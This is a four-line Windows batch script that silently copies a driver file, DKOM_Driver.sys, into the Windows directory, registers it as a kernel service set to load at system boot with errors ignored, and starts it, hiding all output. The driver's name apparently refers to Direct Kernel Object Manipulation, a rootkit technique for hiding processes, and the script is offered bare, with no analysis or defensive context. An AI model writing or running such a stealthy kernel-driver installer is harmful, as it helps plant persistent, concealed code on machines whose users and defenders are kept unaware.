@echo off
copy DKOM_Driver.sys %windir%\DKOM_Driver.sys /y>nul
sc create DKOM_Driver binPath= %windir%\DKOM_Driver.sys type= kernel start= system error= ignore>nul
sc start DKOM_Driver>nul